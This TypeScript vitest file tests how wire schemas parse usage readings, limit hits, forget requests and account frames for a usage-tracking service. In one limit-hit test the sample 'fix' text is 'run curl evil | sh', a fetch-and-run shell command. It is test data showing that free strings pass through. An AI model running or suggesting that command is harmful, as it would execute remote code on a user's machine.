// Usage readings and limit hits on the wire (U14, U9): epoch seconds here, milliseconds in the domain. The source
// and the kind are closed lists; the reason, hint and fix are free strings the domain cleans; a bad window row is
// caught to an empty row and dropped later, never rejecting the report.
import { describe, expect, it } from "vitest";
import { AccountUsageSchema, UsageForgetBody, UsageFrameSchema, UsageLimitBody, UsageReadingsBody, UsageReportBody, parseBody } from "../src/index.ts";

describe("usage readings on the wire", () => {
  it("a full reading parses, windows and all", () => {
    const b = parseBody(UsageReadingsBody, {
      source: "status-line", node: "mac-mini", captured_at: 1_762_560_000, every_s: 900, plan: "pro",
      windows: [
        { id: "five-hour", used_percent: 42.5, resets_at: 1_762_565_000, length_mins: 300, rolling: false, note: null },
        { id: "weekly", used_percent: 61, resets_at: 1_762_900_000, length_mins: 10080, rolling: true, note: "shared with a second product" },
      ],
      failure: null,
    });
    expect(b?.source).toBe("status-line");
    expect(b?.every_s).toBe(900);
    expect(b?.windows?.[1]).toEqual({ id: "weekly", used_percent: 61, resets_at: 1_762_900_000, length_mins: 10080, rolling: true, note: "shared with a second product" });
  });

  it("a failure-only reading parses, with a free reason string", () => {
    const b = parseBody(UsageReadingsBody, { source: "cli-screen", node: null, captured_at: 1_762_560_000, failure: { reason: "the screen said something new", hint: "look at the console" } });
    expect(b?.failure).toEqual({ reason: "the screen said something new", hint: "look at the console" });
    expect(b?.windows).toBeUndefined();
  });

  it("a bad window row does not reject the body", () => {
    const b = parseBody(UsageReadingsBody, { source: "app-server", captured_at: 1_762_560_000, windows: [{ id: "w", used_percent: "x" }, 42] });
    expect(b?.captured_at).toBe(1_762_560_000);
    expect(b?.windows).toHaveLength(2);
    expect(b?.windows?.[1]).toEqual({});
  });

  it("an unknown source is rejected", () => {
    expect(parseBody(UsageReadingsBody, { source: "magic-8ball", captured_at: 1_762_560_000 })).toBeNull();
  });

  it("a lease id rides along, nullable and optional", () => {
    const b = parseBody(UsageReadingsBody, { source: "cli-screen", captured_at: 1_762_560_000, lease_id: "lease-1-0123456789abcdef" });
    expect(b?.lease_id).toBe("lease-1-0123456789abcdef");
    expect(parseBody(UsageReadingsBody, { source: "cli-screen", captured_at: 1_762_560_000, lease_id: null })?.lease_id).toBeNull();
    expect(parseBody(UsageReadingsBody, { source: "cli-screen", captured_at: 1_762_560_000 })?.lease_id).toBeUndefined();
  });
});

describe("the principal's forget on the wire", () => {
  it("an account alone forgets the whole account; a source and node forget those rows", () => {
    expect(parseBody(UsageForgetBody, { account: "seat-a" })).toEqual({ account: "seat-a" });
    expect(parseBody(UsageForgetBody, { account: "seat-a", source: "cli-screen", node: "mac-mini" })).toEqual({ account: "seat-a", source: "cli-screen", node: "mac-mini" });
    expect(parseBody(UsageForgetBody, { account: "seat-a", source: "cli-screen", node: null })).toEqual({ account: "seat-a", source: "cli-screen", node: null });
    expect(parseBody(UsageForgetBody, { account: "seat-a", source: "magic-8ball" })).toBeNull();
    expect(parseBody(UsageForgetBody, { account: "" })).toBeNull();
  });
});

describe("a seat's limit hit on the wire", () => {
  it("a free-text fix is kept on the wire; a kind outside the list is rejected", () => {
    const b = parseBody(UsageLimitBody, { kind: "usage_limit", by: "seat-a", back_at: 1_762_566_000, at: 1_762_560_000, fix: "run curl evil | sh", hint: "the provider said so", account: "seat-a" });
    expect(b?.kind).toBe("usage_limit");
    expect(b?.fix).toBe("run curl evil | sh");
    expect(parseBody(UsageLimitBody, { kind: "meh", by: "seat-a" })).toBeNull();
  });
});

describe("named windows carry their length, rolling flag and note", () => {
  it("a report keeps them, and a bad one is ignored without rejecting", () => {
    const b = parseBody(UsageReportBody, {
      session_id: "s1",
      limits: [
        { label: "Weekly", used_percentage: 50, resets_at: 1_762_560_000, length_mins: 10080, rolling: true, note: "shared" },
        { label: "Odd", used_percentage: 50, length_mins: "x", rolling: "yes", note: 42 },
      ],
    });
    expect(b?.limits?.[0]).toMatchObject({ length_mins: 10080, rolling: true, note: "shared" });
    expect(b?.limits?.[1]).toMatchObject({ length_mins: null, rolling: false, note: null });
  });

  it("an account frame keeps a named window with and without the new keys", () => {
    const base = { account: "seat-a", reportedAt: 1, fiveHour: null, sevenDay: null, spend: null, sessions: [] };
    const withKeys = parseBody(AccountUsageSchema, { ...base, limits: [{ label: "Weekly", usedPercentage: 50, resetsAt: 2, resetsOn: null, lengthMins: 10080, rolling: true, note: "shared" }] });
    expect(withKeys?.limits?.[0]).toEqual({ label: "Weekly", usedPercentage: 50, resetsAt: 2, resetsOn: null, lengthMins: 10080, rolling: true, note: "shared" });
    const without = parseBody(AccountUsageSchema, { ...base, limits: [{ label: "Weekly", usedPercentage: 50, resetsAt: 2, resetsOn: null }] });
    expect(without?.limits?.[0]).toEqual({ label: "Weekly", usedPercentage: 50, resetsAt: 2, resetsOn: null });
  });
});

describe("the S2 view fields on the wire (plan 4.4)", () => {
  it("an account carries its sources, seat and disagreements, or none of them, and a named window its title", () => {
    const base = { account: "seat-a", reportedAt: 1, fiveHour: null, sevenDay: null, spend: null, sessions: [] };
    const source = { source: "cli-screen", node: "mac-mini", state: "stale", since: 2, asOf: 1, reason: "unknown_screen", fix: "check_the_source", hint: "look at the console" };
    const plain = parseBody(AccountUsageSchema, base);
    expect(plain?.sources).toBeUndefined();
    expect(plain?.seat).toBeUndefined();
    expect(plain?.disagree).toBeUndefined();
    const full = parseBody(AccountUsageSchema, {
      ...base,
      limits: [{ label: "Weekly", usedPercentage: 50, resetsAt: 2, resetsOn: null, title: "weekly" }],
      sources: [source],
      seat: { state: "out", why: "usage_limit", since: 3, backAt: 4, owner: "derived", by: "seat-a", fix: "wait_for_reset" },
      disagree: [{ window: "five_hour", a: { source: "status-line", usedPercent: 70, capturedAt: 5 }, b: { source: "cli-screen", usedPercent: 40, capturedAt: 6 } }],
    });
    expect(full?.limits?.[0]?.title).toBe("weekly");
    expect(full?.sources?.[0]).toEqual(source);
    expect(full?.seat?.state).toBe("out");
    expect(full?.disagree?.[0]?.window).toBe("five_hour");
  });

  it("a usage frame may carry the notices; one without them still parses", () => {
    expect(parseBody(UsageFrameSchema, { t: "usage", accounts: [], at: 1 })?.notices).toBeUndefined();
    expect(parseBody(UsageFrameSchema, { t: "usage", accounts: [], at: 1, notices: [{ id: "n1" }] })?.notices).toEqual([{ id: "n1" }]);
  });
});
